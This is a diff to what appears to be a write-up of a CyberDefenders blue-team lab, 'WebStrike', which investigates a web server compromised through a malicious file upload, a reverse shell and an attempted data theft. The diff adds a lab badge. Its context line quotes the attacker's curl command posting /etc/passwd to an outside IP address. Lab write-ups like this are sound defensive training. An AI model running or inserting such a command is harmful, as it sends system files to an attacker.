@@ -124,3 +124,9 @@ curl-XPOST-d/etc/passwd http://117.11.88.124:443/
 The investigation confirmed that the web server was compromised through a malicious file upload. The attacker successfully bypassed file upload restrictions, established a reverse shell connection, and attempted to exfiltrate sensitive system files.
 
 This incident highlights the importance of secure file upload validation, monitoring outbound connections, and continuous network traffic analysis.
+
+## Badge
+<a href="https://cyberdefenders.org/blueteam-ctf-challenges/achievements/nitishapunmiya16406/webstrike/" target="_blank">
+  <img src="https://img.shields.io/badge/-WebStrike_Blue_Team_Lab-0A1AFF?&style=for-the-badge&logo=CyberDefenders&logoColor=white" />
+</a>
+
